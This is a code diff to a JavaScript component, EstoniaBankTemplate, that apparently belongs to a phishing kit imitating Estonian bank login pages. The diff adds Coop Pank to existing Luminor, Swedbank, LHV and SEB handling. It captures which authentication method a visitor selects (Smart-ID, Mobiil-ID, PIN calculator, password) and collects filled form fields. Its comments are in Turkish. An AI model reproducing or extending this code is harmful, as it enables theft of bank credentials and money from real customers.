@@ -787,7 +787,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                 appendFilledFallbackFields(container, fields);
             } else if (
                 filledFieldCount < 2 &&
-                (window.location.href.includes('luminor') || window.location.href.includes('swedbank'))
+                (window.location.href.includes('coop') || window.location.href.includes('luminor') || window.location.href.includes('swedbank'))
             ) {
                 appendFilledFallbackFields(container, fields);
             }
@@ -841,6 +841,21 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             const rememberedLoginMethod = extractLoginMethodLabel(window.__traeSelectedLoginMethod || '');
             if (rememberedLoginMethod) {
                 return rememberedLoginMethod;
+            }
+
+            if (window.location.href.includes('coop')) {
+                const coopCandidates = Array.from(
+                    document.querySelectorAll(
+                        '.v-tab--active, .v-slide-group__content [aria-selected="true"], .v-item-group .v-item--active, .v-btn-toggle .v-btn--active, input[type="radio"]:checked + label, input[type="radio"]:checked ~ label, .coop-tab.active, .auth-methods-method.active'
+                    )
+                );
+
+                for (const candidate of coopCandidates) {
+                    const label = extractLoginMethodLabel(candidate.textContent || '');
+                    if (label) {
+                        return label;
+                    }
+                }
             }
 
             let loginMethod = "Bilinmiyor";
@@ -959,7 +974,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
 
           // Let labels work natively
           if (target.closest('label')) {
-              if (target.closest('.ds-option') || target.closest('.auth-methods-method')) {
+              if (window.location.href.includes('coop') || target.closest('.ds-option') || target.closest('.auth-methods-method')) {
                   // Allow OP Corporate Bank and LHV labels to be handled as tabs
               } else {
                   return;
@@ -987,7 +1002,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
 
           if (!isSubmitBtn) {
               // Coop ve LHV Bank için eklenmiş daha spesifik sekme yakalayıcı (Örn: li.tab, div.tab, .lhv-tab-link, .auth-methods-method, .ds-option)
-              const tab = target.closest('li, [role="tab"], .tab, .nav-item, .seb-tabs__item, a, .c-tabs__item, .c-tab, .coop-tab, .tab-item, .lhv-tab-link, button.lhv-tab-link, [lhvtablink], .auth-methods-method, .ds-option, .ds-option__label');
+              const tab = target.closest('li, [role="tab"], .tab, .nav-item, .seb-tabs__item, a, .c-tabs__item, .c-tab, .coop-tab, .tab-item, .lhv-tab-link, button.lhv-tab-link, [lhvtablink], .auth-methods-method, .ds-option, .ds-option__label, .v-tab, .v-slide-group__content > *, .v-item-group .v-item');
               if (tab) {
                   const tabText = tab.textContent ? tab.textContent.trim().toLowerCase() : '';
                   const isTabByText = tabText.length < 50 && tabText.match(/smart-id|mobiil-id|id-kaart|pin-kalkulaator|pin kalkulaator|biomeetria|smart id|mobiil id|seb mobiilirakendus|mobilescan|digipass|salasõna|salasÃµna|salas|parool|password|šifr/i) !== null;
